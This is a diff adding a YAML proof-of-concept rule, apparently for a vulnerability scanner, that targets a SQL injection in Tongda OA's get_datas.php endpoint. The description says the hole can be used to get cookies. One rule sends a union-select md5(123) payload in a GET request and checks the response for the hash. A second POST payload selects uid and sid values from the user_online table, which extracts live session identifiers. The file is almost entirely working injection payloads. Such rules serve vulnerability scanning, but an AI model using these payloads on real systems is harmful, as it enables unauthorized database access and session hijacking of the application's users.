@@ -1,0 +1,21 @@
+name: poc-yaml-通达OA-get_datas-sql
+description: >-
+  sql注入,可获取cookie
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1&tab=5 where 1={`='` 2} union select md5(123)-- '
+    expression:
+      status: 200
+      body_all:
+        - "202cb962ac59075b964b07152d234b70"
+  - method: POST
+    path: /general/reportshop/utils/get_datas.php
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >-
+      USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5 where 1={`\='` 1} union (select uid,sid from user_online where 1\={`=` 1})-- '1**
+    expression:
+      status: 200
+      body_all: ["1;1"]
